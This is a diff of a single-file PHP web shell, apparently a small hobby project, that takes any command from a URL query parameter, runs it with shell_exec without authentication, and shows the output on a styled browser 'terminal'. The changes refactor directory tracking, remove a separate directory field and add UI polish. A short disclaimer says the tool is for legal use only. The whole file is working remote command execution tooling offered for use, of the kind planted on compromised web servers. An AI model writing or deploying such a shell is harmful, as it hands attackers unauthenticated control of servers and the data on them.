@@ -1,30 +1,51 @@
 <?php
 
 #   Single-file php shell made by Squar3
-
+#    TOS
 #    This tool can only be used for legal purposes. You take full responsibility for any actions performed using this.
 #    The owner of the tool is not responsible for the damage caused by it.
 #    DON'T USE IT WITHOUT PERMESSIONS
 
+### START OF PHP
 
+// ini_set('display_errors', 1);ini_set('display_startup_errors', 1);error_reporting(E_ALL);
 
 session_start();
+#Setting the location variable
 if ($_SESSION['location'] === null) {
     $location = exec("pwd");
-    $_SESSION['location'] = exec("pwd");
+    $_SESSION['location'] = $location;
 } else {
     $location = $_SESSION['location'];
 }
+
+
 if (!isset($_GET['cmd']) || $_GET['cmd'] == null) {
-    $cmd = "whoami";
+    $cmd = "whoami"; #Default command
 } else {
     $cmd = $_GET['cmd'];
+    #We will add ; after the $_GET['cmd'] so we need to remove the `;` from the end in case the user put it there (Idk if you know what I'm talking about)
+    if ($cmd[strlen($cmd) - 1] == ";") {
+        $cmd = substr($cmd, 0, -1);
+    }
+                                                                    }### START OF PHP
+
+#THE COMMAND THAT WILL EXECUTE
+$ot_cmd = shell_exec("cd " . $location . ";" . $cmd . ";echo '\n###Current path';pwd;"); # IN CASE YOU ARE EDDITING THIS DON'T REMOVE THE (pwd) command since we use it later
+
+
+try {
+    #Getting the return of whoami from $ot_cmd
+    $output_list =  explode("\n", $ot_cmd);
+    $_SESSION['location'] = $output_list[sizeof($output_list) - 2];
+    $location = $_SESSION['location'];
+} catch (exception $e) {
+    //handle the exception, BUT I DON'T EVEN CARE ABOUT THE exception
 }
-if (isset($_GET['new-location']) && $_GET['new-location'] != null) {
-    $_SESSION['location'] = exec("cd ". $_SESSION['location'] .";".$_GET['new-location'] . ";pwd;");
-    print("<script>document.location = location.protocol + '//' + location.host + location.pathname</script>");
-}
+
+### END OF PHP
 ?>
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -33,6 +54,34 @@ if (isset($_GET['new-location']) && $_GET['new-location'] != null) {
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>My Shell</title>
+</head>
+
+<body>
+    <center>
+        <!-- Reset button -->
+        <button class="button button1" onclick="deleteAllCookies()">Reset</button><br><br>
+
+        <!-- Terminal output -->
+        <div class="terminal">
+            <br>
+
+            <p class="bash">
+                <location>[<?= shell_exec('whoami'); ?><?= $location ?>]$</location> <?= $cmd ?>
+            </p>
+            <pre style="color:white;position:relative;left:20px;"><?= $ot_cmd ?></pre>
+
+        </div>
+
+        <!-- Terminal input -->
+        <form method="GET">
+            <input name="cmd" class="terminal-input" autofocus placeholder="Enter command here."><br><br>
+            <br><br><button class="button button1" type="submit">Send</button>
+        </form>
+
+        <br>
+    </center>
+
+    <!-- CSS -->
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Mono&display=swap');
 
@@ -58,6 +107,12 @@ if (isset($_GET['new-location']) && $_GET['new-location'] != null) {
             background-color: black;
             color: white;
             border: none;
+            font-size: 15px;
+            font-family: 'Noto Sans Mono', monospace;
+        }
+
+        .terminal-input:focus {
+            outline: none;
         }
 
         .bash {
@@ -99,44 +154,21 @@ if (isset($_GET['new-location']) && $_GET['new-location'] != null) {
             color: white;
         }
     </style>
-</head>
+    <!-- JS -->
+    <script>
+        function deleteAllCookies() {
+            var cookies = document.cookie.split(";");
 
-<body>
-    <center>
-        <button class="button button1" onclick="deleteAllCookies()">Clear</button><br><br>
-
-        <div class="terminal">
-            <br>
-
-            <p class="bash">
-                <location>$ <?= $location ?></location> <?= $cmd ?>
-            </p>
-            <pre style="color:white;position:relative;left:20px;"><?= shell_exec("cd " . $location . ";" . $cmd); ?></pre>
-
-        </div>
-        <form method="GET">
-            <input name="cmd" class="terminal-input" placeholder="Enter command here."><br><br>
-            <input style="background-color:yellowgreen;color:black;font-size: 11px;" name="new-location" class="terminal-input" placeholder="(optional to change default directory) | Example [ cd ../imgs/ ]">
-            <br><br><button class="button button1" type="submit">Send</button>
-        </form>
-
-        <br>
-
-        <script>
-            function deleteAllCookies() {
-                var cookies = document.cookie.split(";");
-
-                for (var i = 0; i < cookies.length; i++) {
-                    var cookie = cookies[i];
-                    var eqPos = cookie.indexOf("=");
-                    var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
-                    document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
-                    document.location = location.protocol + '//' + location.host + location.pathname
-                    // location.reload();
-                }
+            for (var i = 0; i < cookies.length; i++) {
+                var cookie = cookies[i];
+                var eqPos = cookie.indexOf("=");
+                var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
+                document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
+                document.location = location.protocol + '//' + location.host + location.pathname
+                // location.reload();
             }
-        </script>
-    </center>
+        }
+    </script>
 </body>
 
 </html>
